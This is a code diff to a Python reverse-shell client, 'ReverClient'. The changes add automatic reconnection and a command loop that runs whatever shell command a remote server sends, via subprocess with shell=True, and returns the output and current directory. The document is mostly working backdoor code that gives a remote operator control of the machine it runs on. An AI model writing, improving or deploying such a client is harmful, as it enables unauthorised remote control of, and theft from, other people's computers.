@@ -30,6 +30,8 @@ class ReverClient:
         except socket.error as err:
             print('[!] Couldn\'t connect to the server: ' + str(err))
             print('[!] Retrying...')
+            self.s.close()
+            self.s = socket.socket()
             self.connect_socket()
 
     def receive_commands(self):
@@ -37,33 +39,56 @@ class ReverClient:
         Receives commands until 'quit' is received
         """
         while True:
-            sign = self.s.recv(1024)
-            time.sleep(0.1)
-            self.s.send(sign)
+            try:
+                sign = self.s.recv(1024)
+                time.sleep(0.1)
+                self.s.send(sign)
+            except:
+                self.s.close()
+                self.s = socket.socket()
+                self.connect_socket()
+                continue
+            cont = True
             if sign == b'ayylmao':
                 continue
+
+            # Command received
             rdata = self.s.recv(10240)
             cmdd = rdata.decode('utf-8')[:]
-            if cmdd[:2] == 'cd':
-                os.chdir(cmdd[3:])
+            args = cmdd.split()
+
+            # CD command
+            if args[0] == 'cd':
+                try:
+                    os.chdir(args[1])
+                except:
+                    self.s.send(str.encode(os.getcwd(), errors='ignore'))
+                    time.sleep(0.1)
+                    self.s.send(str.encode(os.getcwd()))
+
+            # Checks if any of the commands above where executed
+            else:
+                cont = False
+            if cont:
                 self.s.send(str.encode(os.getcwd(), errors='ignore'))
                 time.sleep(0.1)
                 self.s.send(str.encode(os.getcwd()))
                 continue
-            if cmdd.split()[0] == 'mkdir':
-                os.mkdir(cmdd.split()[1])
-                self.s.send(str.encode(os.getcwd(), errors='ignore'))
-                time.sleep(0.1)
-                self.s.send(str.encode(os.getcwd()))
-                continue
+
+            # Normal proccesses
             try:
                 cmd = subprocess.Popen(cmdd, shell=True, stdout=-1, stderr=-1, stdin=-1)
                 output = str(cmd.stdout.read() + cmd.stderr.read(), 'utf-8', errors='ignore')
+                if output == '':
+                    self.s.send(str.encode('\n[*] Command executed\n', errors='ignore'))
+                    time.sleep(0.1)
+                    self.s.send(str.encode(os.getcwd()))
+                    continue
                 self.s.send(str.encode(output, errors='ignore'))
                 time.sleep(0.1)
                 self.s.send(str.encode(os.getcwd()))
             except:
-                self.s.send(str.encode('Command not found\n'))
+                self.s.send(str.encode('[!] Error  \n'))
                 time.sleep(0.1)
                 self.s.send(str.encode(os.getcwd()))
 
@@ -71,3 +96,5 @@ class ReverClient:
 client = ReverClient()
 client.connect_socket()
 client.receive_commands()
+
+
